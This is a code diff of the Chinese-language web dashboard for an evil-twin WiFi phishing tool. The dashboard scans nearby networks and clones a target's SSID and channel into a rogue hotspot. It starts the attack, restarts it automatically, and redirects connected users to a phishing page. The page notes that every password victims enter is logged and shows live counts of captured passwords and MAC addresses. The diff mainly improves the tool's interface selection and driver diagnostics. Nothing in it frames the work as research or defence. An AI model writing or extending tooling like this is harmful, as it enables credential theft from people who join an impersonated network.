@@ -16,10 +16,13 @@
         .form-group small { display: block; color: #4ecdc4; font-size: 11px; margin-top: 3px; }
         label { display: block; margin-bottom: 5px; color: #aaa; }
         input, select { width: 100%; padding: 10px; background: #0f3460; border: none; border-radius: 5px; color: #fff; font-size: 14px; }
+        select option { background: #0f3460; color: #fff; }
         button { background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 14px; margin-right: 10px; transition: all 0.3s; }
         button:hover { background: #ff6b6b; transform: scale(1.02); }
+        button:disabled { background: #555; cursor: not-allowed; transform: none; }
         .btn-danger { background: #dc3545; }
         .btn-success { background: #28a745; }
+        .btn-sm { padding: 5px 12px; font-size: 12px; }
         .status { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; }
         .status-running { background: #28a745; box-shadow: 0 0 5px #28a745; }
         .status-stopped { background: #dc3545; }
@@ -35,12 +38,33 @@
         .alert { padding: 10px; border-radius: 5px; margin-bottom: 15px; display: none; }
         .alert-success { background: #28a74520; border: 1px solid #28a745; color: #28a745; }
         .alert-error { background: #dc354520; border: 1px solid #dc3545; color: #dc3545; }
-        .warning-text { color: #ffcc66; font-size: 12px; margin-top: 6px; }
-        .iface-panel { background: #0f3460; border-radius: 5px; padding: 10px; margin-top: 8px; font-size: 12px; }
-        .iface-table th, .iface-table td { padding: 6px; font-size: 12px; }
-        .tag { display: inline-block; padding: 2px 6px; border-radius: 4px; background: #1a1a2e; color: #ddd; margin: 1px; }
-        .tag-warn { color: #ffcc66; border: 1px solid #ffcc66; }
-        .tag-ok { color: #4ecdc4; border: 1px solid #4ecdc4; }
+        .alert-warning { background: #ffc10720; border: 1px solid #ffc107; color: #ffc107; }
+        .iface-card {
+            background: #0f3460;
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 8px;
+            border-left: 3px solid #4ecdc4;
+        }
+        .iface-card.default-route { border-left-color: #ffc107; background: #0f346030; }
+        .iface-card .iface-name { font-weight: bold; color: #4ecdc4; font-size: 15px; }
+        .iface-card .iface-meta { font-size: 11px; color: #888; margin-top: 4px; }
+        .iface-card .iface-meta span { margin-right: 12px; padding: 2px 6px; background: #1a1a2e; border-radius: 3px; }
+        .iface-card .iface-warn { color: #ffc107; font-size: 11px; margin-top: 4px; }
+        .iface-card .iface-recommend { color: #28a745; font-size: 11px; }
+        .diag-panel {
+            background: #0a0f1a;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 10px;
+            margin-top: 12px;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+        .diag-panel .diag-ok { color: #28a745; }
+        .diag-panel .diag-warn { color: #ffc107; }
+        .diag-panel .diag-error { color: #dc3545; }
+        .diag-panel code { color: #4ecdc4; background: #111; padding: 1px 4px; border-radius: 3px; }
     </style>
 </head>
 <body>
@@ -53,6 +77,29 @@
         </div>
         <div id="alert" class="alert"></div>
         <div class="dashboard">
+
+            <!-- ========== 网卡管理 ========== -->
+            <div class="card" style="grid-column: 1 / -1;">
+                <h2>📡 无线网卡管理</h2>
+                <div id="iface_list_container" style="margin-bottom: 12px;">
+                    <span style="color:#888;">正在检测网卡...</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+                    <div class="form-group" style="flex: 1; min-width: 250px; margin-bottom: 0;">
+                        <label>选择扫描/热点网卡</label>
+                        <select id="network_interface" onchange="onIfaceSelect()">
+                            <option value="">-- 未选择 --</option>
+                        </select>
+                        <small id="iface_hint" style="min-height: 16px;"></small>
+                    </div>
+                    <button onclick="refreshInterfaces()" class="btn-sm" style="background:#4ecdc4; margin:0;">🔄 刷新网卡</button>
+                    <button onclick="saveInterfaceOnly()" class="btn-sm" style="background:#28a745; margin:0;">💾 保存选择</button>
+                </div>
+                <div id="iface_warning" style="margin-top: 10px; display: none;" class="alert-warning"></div>
+                <div id="usb_diag" class="diag-panel" style="display: none;"></div>
+            </div>
+
+            <!-- ========== 热点配置 ========== -->
             <div class="card">
                 <h2>⚙️ 热点配置</h2>
                 <div class="form-group">
@@ -68,32 +115,13 @@
                     </select>
                 </div>
                 <div class="form-group">
-                    <label>无线网卡接口名 <small id="iface_hint">自动检测中...</small></label>
-                    <select id="network_interface" onchange="updateInterfaceWarning()">
-                        {% if config.network_interface %}
-                        <option value="{{ config.network_interface }}" selected>{{ config.network_interface }}</option>
-                        {% endif %}
-                    </select>
-                    <div id="iface_warning" class="warning-text" style="display:none;"></div>
-                    <div class="iface-panel">
-                        <div>当前保存: <span id="iface_saved">{{ config.network_interface or '未设置' }}</span></div>
-                        <div>推荐接口: <span id="iface_recommended">检测中...</span></div>
-                        <button type="button" onclick="detectInterfaces()" style="margin-top:8px; padding:6px 10px;">刷新网卡</button>
-                    </div>
-                    <table class="iface-table" id="iface_table" style="display:none;">
-                        <thead>
-                            <tr><th>接口</th><th>状态</th><th>SSID</th><th>IP</th><th>标记</th></tr>
-                        </thead>
-                        <tbody id="iface_body"></tbody>
-                    </table>
-                    <div id="iface_diag" class="warning-text"></div>
-                </div>
-                <div class="form-group">
                     <label>热点密码（客户端连接用）</label>
                     <input type="text" id="evil_passphrase" value="{{ config.evil_passphrase or '12345678' }}" placeholder="12345678">
                 </div>
                 <button onclick="saveConfig()"> 保存配置</button>
             </div>
+
+            <!-- ========== 攻击控制 ========== -->
             <div class="card">
                 <h2> 攻击控制</h2>
                 <div id="status_indicator">
@@ -115,6 +143,8 @@
                     </div>
                 </div>
             </div>
+
+            <!-- ========== 钓鱼入口 ========== -->
             <div class="card">
                 <h2> 钓鱼入口</h2>
                 <p>用户连接后访问任意网站将被重定向到:</p>
@@ -123,10 +153,13 @@
                 </code>
                 <p style="font-size:12px; color:#888;">※ 用户输入的任何密码都会被记录</p>
             </div>
-            <div class="card">
+
+            <!-- ========== WiFi 扫描 ========== -->
+            <div class="card" style="grid-column: 1 / -1;">
                 <h2>📡 周围 WiFi 扫描</h2>
                 <button onclick="scanWiFi()" id="scan_btn">🔍 开始扫描</button>
                 <span id="scan_status" style="font-size:12px; color:#888; margin-left:10px;"></span>
+                <span id="scan_warn" style="font-size:11px; color:#ffc107; margin-left:8px;"></span>
                 <table id="scan_table" style="display:none; margin-top:10px;">
                     <thead>
                         <tr><th>SSID</th><th>信号</th><th>信道</th><th>加密</th><th>操作</th></tr>
@@ -137,143 +170,260 @@
         </div>
     </div>
     <script>
+        var interfacesData = [];
+
         function showAlert(message, type) {
-            const alert = document.getElementById('alert');
+            var alert = document.getElementById('alert');
             alert.className = 'alert alert-'+type;
             alert.innerHTML = message;
             alert.style.display = 'block';
-            setTimeout(function(){ alert.style.display = 'none'; }, 3000);
+            setTimeout(function(){ alert.style.display = 'none'; }, 5000);
         }
+
+        async function refreshInterfaces() {
+            var list = document.getElementById('network_interface');
+            var container = document.getElementById('iface_list_container');
+            var hint = document.getElementById('iface_hint');
+            var diag = document.getElementById('usb_diag');
+
+            container.innerHTML = '<span style="color:#888;">🔄 正在检测网卡...</span>';
+            diag.style.display = 'none';
+
+            try {
+                var r = await fetch('/api/interfaces');
+                var data = await r.json();
+
+                interfacesData = data.interfaces || [];
+                var recommended = data.recommended || '';
+                var diagData = data.diagnostics || {};
+
+                list.innerHTML = '<option value="">-- 请选择网卡 --</option>';
+
+                interfacesData.forEach(function(iface) {
+                    var opt = document.createElement('option');
+                    opt.value = iface.name;
+
+                    var label = iface.name;
+                    var tags = [];
+                    if (iface.state === 'UP') tags.push('UP');
+                    if (iface.connected && iface.ssid) tags.push('已连接 ' + iface.ssid);
+                    if (iface.default_route) tags.push('默认路由');
+                    if (iface.recommended) tags.push('推荐');
+                    if (tags.length > 0) label += ' [' + tags.join(', ') + ']';
+
+                    opt.textContent = label;
+                    if (iface.default_route) opt.style.color = '#ffc107';
+                    list.appendChild(opt);
+                });
+
+                // 获取已保存网卡
+                var configResp = await fetch('/api/config');
+                var configData = await configResp.json();
+                var savedIface = configData.network_interface || '';
+
+                if (savedIface && interfacesData.find(function(i){ return i.name === savedIface; })) {
+                    list.value = savedIface;
+                } else if (recommended) {
+                    list.value = recommended;
+                }
+
+                // 网卡卡片
+                var html = '';
+                interfacesData.forEach(function(iface) {
+                    var cardClass = iface.default_route ? 'iface-card default-route' : 'iface-card';
+                    html += '<div class="' + cardClass + '">';
+                    html += '<div class="iface-name">' + iface.name;
+                    if (iface.recommended) html += ' <span class="iface-recommend">★ 推荐</span>';
+                    html += '</div>';
+                    html += '<div class="iface-meta">';
+                    html += '<span>状态: ' + iface.state + '</span>';
+                    if (iface.connected && iface.ssid) html += '<span>SSID: ' + iface.ssid + '</span>';
+                    if (iface.ips && iface.ips.length > 0) html += '<span>IP: ' + iface.ips.join(', ') + '</span>';
+                    html += '</div>';
+                    if (iface.default_route) {
+                        html += '<div class="iface-warn">⚠️ 默认路由网卡 — 用于SSH/上网，切换可能断开连接</div>';
+                    }
+                    html += '</div>';
+                });
+
+                if (interfacesData.length === 0) {
+                    html = '<span style="color:#dc3545;">⚠️ 未检测到任何无线网卡</span>';
+                }
+                container.innerHTML = html;
+
+                hint.textContent = interfacesData.length > 0
+                    ? '已检测到 ' + interfacesData.length + ' 个无线网卡 | 推荐: ' + (recommended || '无')
+                    : '未检测到无线网卡，请插入 USB WiFi 网卡后刷新';
+
+                updateDiagPanel(diagData);
+                onIfaceSelect();
+
+            } catch(e) {
+                container.innerHTML = '<span style="color:#dc3545;">检测失败: ' + e + '</span>';
+                hint.textContent = '网络错误，请检查服务是否运行';
+            }
+        }
+
+        function updateDiagPanel(diag) {
+            var panel = document.getElementById('usb_diag');
+            if (!diag) { panel.style.display = 'none'; return; }
+
+            var html = '<strong>🔧 USB 设备诊断</strong><br>';
+
+            html += 'lsusb WiFi 设备: ';
+            if (diag.usb_wifi_detected) {
+                html += '<span class="diag-ok">已检测到</span>';
+                if (diag.usb_wifi_ids && diag.usb_wifi_ids.length > 0) {
+                    html += '<br>  <code>' + diag.usb_wifi_ids.join(', ') + '</code>';
+                }
+                html += '<br>';
+            } else {
+                html += '<span class="diag-warn">未检测到</span><br>';
+            }
+
+            html += 'iw dev 接口: ';
+            if (diag.iw_created_wireless_interface) {
+                html += '<span class="diag-ok">已创建</span><br>';
+            } else {
+                html += '<span class="diag-warn">未创建无线接口</span><br>';
+            }
+
+            if (diag.driver_warning) {
+                html += '<br><span class="diag-error">⚠️ ' + diag.driver_warning + '</span>';
+            }
+
+            if (!diag.driver_warning && diag.usb_wifi_detected && diag.iw_created_wireless_interface) {
+                html += '<br><span class="diag-ok">✅ 驱动正常</span>';
+            }
+
+            panel.innerHTML = html;
+            panel.style.display = 'block';
+        }
+
+        function onIfaceSelect() {
+            var select = document.getElementById('network_interface');
+            var warnDiv = document.getElementById('iface_warning');
+            var selected = select.value;
+
+            warnDiv.style.display = 'none';
+            if (!selected) return;
+
+            var ifaceInfo = interfacesData.find(function(i){ return i.name === selected; });
+            if (!ifaceInfo) return;
+
+            if (ifaceInfo.default_route) {
+                warnDiv.innerHTML = '⚠️ 这个网卡正在用于服务器联网/SSH，使用它可能导致远程连接断开。';
+                warnDiv.className = 'alert alert-warning';
+                warnDiv.style.display = 'block';
+            }
+        }
+
+        async function saveInterfaceOnly() {
+            var iface = document.getElementById('network_interface').value;
+            if (!iface) { showAlert('请先选择一个网卡', 'error'); return; }
+
+            var ifaceInfo = interfacesData.find(function(i){ return i.name === iface; });
+            if (ifaceInfo && ifaceInfo.default_route) {
+                if (!confirm('⚠️ ' + iface + ' 是默认路由网卡，正在用于SSH/上网。\n\n选择它可能导致远程连接断开！\n\n确定要继续吗？')) return;
+            }
+
+            try {
+                var evil_ssid = document.getElementById('evil_ssid').value;
+                var evil_channel = parseInt(document.getElementById('evil_channel').value);
+                var evil_passphrase = document.getElementById('evil_passphrase').value.trim() || '12345678';
+
+                var r = await fetch('/api/config', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        evil_ssid: evil_ssid, evil_channel: evil_channel,
+                        network_interface: iface, evil_passphrase: evil_passphrase
+                    })
+                });
+                var data = await r.json();
+                if (data.status === 'success') {
+                    showAlert('网卡已保存: ' + iface, 'success');
+                    refreshInterfaces();
+                } else {
+                    showAlert('保存失败: ' + (data.message || '未知错误'), 'error');
+                }
+            } catch(e) {
+                showAlert('保存失败: ' + e, 'error');
+            }
+        }
+
         async function saveConfig() {
             var evil_ssid = document.getElementById('evil_ssid').value;
             var evil_channel = parseInt(document.getElementById('evil_channel').value);
             var network_interface = document.getElementById('network_interface').value.trim();
-            var selected = interfaceDetails[network_interface];
-            if (selected && selected.default_route) {
-                var ok = confirm('这个网卡正在用于服务器联网/SSH，使用它可能导致远程连接断开。');
-                if (!ok) { return; }
-            }
             var evil_passphrase = document.getElementById('evil_passphrase').value.trim() || '12345678';
+
+            if (!network_interface) {
+                showAlert('请先在"无线网卡管理"中选择一个网卡', 'error');
+                return;
+            }
+
             var response = await fetch('/api/config', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ evil_ssid: evil_ssid, evil_channel: evil_channel, network_interface: network_interface, evil_passphrase: evil_passphrase })
+                body: JSON.stringify({
+                    evil_ssid: evil_ssid, evil_channel: evil_channel,
+                    network_interface: network_interface, evil_passphrase: evil_passphrase
+                })
             });
             var data = await response.json();
             if (data.status === 'success') {
                 showAlert('配置已保存，热点将自动重启', 'success');
             } else {
-                showAlert('保存失败', 'error');
+                showAlert('保存失败: ' + (data.message || ''), 'error');
             }
         }
+
         async function startAttack() {
+            var iface = document.getElementById('network_interface').value;
+            if (!iface) { showAlert('请先选择网卡', 'error'); return; }
+            var ifaceInfo = interfacesData.find(function(i){ return i.name === iface; });
+            if (ifaceInfo && ifaceInfo.default_route) {
+                if (!confirm('⚠️ ' + iface + ' 是默认路由网卡！\n\n启动攻击可能断开SSH连接。\n\n确定要继续吗？')) return;
+            }
+
             var response = await fetch('/api/start', { method: 'POST' });
             var data = await response.json();
             if (data.status === 'success') {
                 showAlert(data.message, 'success');
                 updateStatus();
             } else {
-                showAlert('启动失败: ' + (data.message || '') + (data.stderr ? ' | ' + data.stderr : ''), 'error');
+                showAlert('启动失败: ' + (data.message || ''), 'error');
             }
         }
+
         async function stopAttack() {
             var response = await fetch('/api/stop', { method: 'POST' });
             var data = await response.json();
             showAlert(data.message, 'success');
             updateStatus();
         }
-        var interfaceDetails = {};
-        async function detectInterfaces() {
-            try {
-                var r = await fetch('/api/interfaces');
-                var data = await r.json();
-                var ifaces = data.interfaces || [];
-                var names = data.names || ifaces.map(function(item) { return item.name; });
-                var select = document.getElementById('network_interface');
-                var hint = document.getElementById('iface_hint');
-                var body = document.getElementById('iface_body');
-                var table = document.getElementById('iface_table');
-                var diag = document.getElementById('iface_diag');
-                interfaceDetails = {};
-                select.innerHTML = '';
-                body.innerHTML = '';
-                ifaces.forEach(function(item) {
-                    interfaceDetails[item.name] = item;
-                    var opt = document.createElement('option');
-                    opt.value = item.name;
-                    opt.textContent = item.name + (item.recommended ? ' (推荐)' : '');
-                    select.appendChild(opt);
 
-                    var row = body.insertRow();
-                    row.insertCell(0).textContent = item.name;
-                    row.insertCell(1).textContent = item.state || 'UNKNOWN';
-                    row.insertCell(2).textContent = item.ssid || (item.connected ? '已连接' : '-');
-                    row.insertCell(3).textContent = item.ips && item.ips.length ? item.ips.join(', ') : '-';
-                    var tags = [];
-                    if (item.default_route) tags.push('<span class="tag tag-warn">默认路由/SSH风险</span>');
-                    if (item.is_usb_likely) tags.push('<span class="tag tag-ok">USB</span>');
-                    if (item.recommended) tags.push('<span class="tag tag-ok">推荐</span>');
-                    row.insertCell(4).innerHTML = tags.join(' ');
-                });
-                if (names.length > 0) {
-                    hint.textContent = '已检测到 ' + names.length + ' 个无线网卡';
-                    table.style.display = 'table';
-                    select.value = data.current || data.recommended || names[0];
-                    document.getElementById('iface_saved').textContent = data.current || data.saved || '未设置';
-                    document.getElementById('iface_recommended').textContent = data.recommended || '无';
-                    if (data.changed) {
-                        showAlert('数据库里的网卡不存在，已自动切换为 ' + data.current, 'success');
-                    }
-                } else {
-                    hint.textContent = '未检测到无线网卡';
-                    table.style.display = 'none';
-                    document.getElementById('iface_recommended').textContent = '无';
-                }
-                var d = data.diagnostics || {};
-                var diagText = '';
-                if (d.usb_wifi_detected) {
-                    diagText += 'lsusb 已识别 USB WiFi: ' + (d.usb_devices || []).join(' | ');
-                } else {
-                    diagText += 'lsusb 未识别到 Netgear/MediaTek USB WiFi';
-                }
-                if (d.driver_warning) {
-                    diagText += '<br>' + d.driver_warning;
-                }
-                if (d.iw_error) {
-                    diagText += '<br>iw dev 错误: ' + d.iw_error;
-                }
-                diag.innerHTML = diagText;
-                updateInterfaceWarning();
-            } catch(e) {
-                document.getElementById('iface_hint').textContent = '检测失败';
-            }
-        }
-        function updateInterfaceWarning() {
-            var name = document.getElementById('network_interface').value;
-            var info = interfaceDetails[name];
-            var warning = document.getElementById('iface_warning');
-            if (info && info.default_route) {
-                warning.textContent = '这个网卡正在用于服务器联网/SSH，使用它可能导致远程连接断开。';
-                warning.style.display = 'block';
-            } else {
-                warning.style.display = 'none';
-            }
-        }
         async function scanWiFi() {
             var btn = document.getElementById('scan_btn');
-            var status = document.getElementById('scan_status');
+            var statusEl = document.getElementById('scan_status');
+            var warnEl = document.getElementById('scan_warn');
             var table = document.getElementById('scan_table');
             var tbody = document.getElementById('scan_body');
             btn.disabled = true;
             btn.textContent = '⏳ 扫描中...';
-            status.textContent = '扫描需要 3-8 秒';
+            statusEl.textContent = '扫描需要 3-8 秒';
+            warnEl.textContent = '';
             try {
                 var r = await fetch('/api/scan', { method: 'POST' });
                 var data = await r.json();
                 btn.disabled = false;
                 btn.textContent = '🔍 开始扫描';
                 if (data.status === 'success') {
-                    status.textContent = '使用 ' + (data.interface || '当前网卡') + ' 发现 ' + data.count + ' 个 WiFi';
+                    statusEl.textContent = '发现 ' + data.count + ' 个 WiFi (网卡: ' + data.interface + ')';
+                    if (data.warnings && data.warnings.length > 0) {
+                        warnEl.textContent = data.warnings.join('; ');
+                    }
                     table.style.display = 'block';
                     tbody.innerHTML = '';
                     data.results.forEach(function(ap) {
@@ -288,25 +438,25 @@
                         cloneBtn.textContent = '🎯 克隆';
                         cloneBtn.style.padding = '5px 10px';
                         cloneBtn.style.fontSize = '12px';
-                        cloneBtn.onclick = function() {
-                            cloneAp(ap.ssid, ap.channel);
-                        };
+                        cloneBtn.onclick = function() { cloneAp(ap.ssid, ap.channel); };
                         actionCell.appendChild(cloneBtn);
                     });
                 } else {
-                    status.textContent = '扫描失败: ' + data.message + (data.stderr ? ' | ' + data.stderr : '');
+                    statusEl.textContent = '扫描失败: ' + (data.message || '未知错误');
                 }
             } catch(e) {
                 btn.disabled = false;
                 btn.textContent = '🔍 开始扫描';
-                status.textContent = '网络错误';
+                statusEl.textContent = '网络错误';
             }
         }
+
         function cloneAp(ssid, channel) {
             document.getElementById('evil_ssid').value = ssid;
             document.getElementById('evil_channel').value = channel;
             showAlert('已填入 SSID: ' + ssid + '  信道: ' + channel + '，请点击保存配置', 'success');
         }
+
         var wasRunning = false;
         async function updateStatus() {
             var response = await fetch('/api/status');
@@ -320,16 +470,15 @@
             } else {
                 light.className = 'status status-stopped';
                 text.innerText = '已停止';
-                // 自动恢复：如果之前是运行态且非用户手动停止
                 if (wasRunning && !stopRequested) {
                     text.innerText = '重启中...';
-                    light.className = 'status status-stopped';
                     setTimeout(async function() {
                         try { await fetch('/api/start', { method: 'POST' }); } catch(e) {}
                     }, 5000);
                 }
             }
         }
+
         var stopRequested = false;
         var origStopAttack = stopAttack;
         stopAttack = async function() {
@@ -337,6 +486,7 @@
             await origStopAttack();
             setTimeout(function() { stopRequested = false; }, 15000);
         };
+
         setInterval(updateStatus, 5000);
         setInterval(async function() {
             var response = await fetch('/api/passwords');
@@ -346,7 +496,8 @@
             var macs = await macResp.json();
             document.getElementById('mac_count').innerText = macs.length;
         }, 3000);
-        detectInterfaces();
+
+        refreshInterfaces();
         updateStatus();
     </script>
 </body>
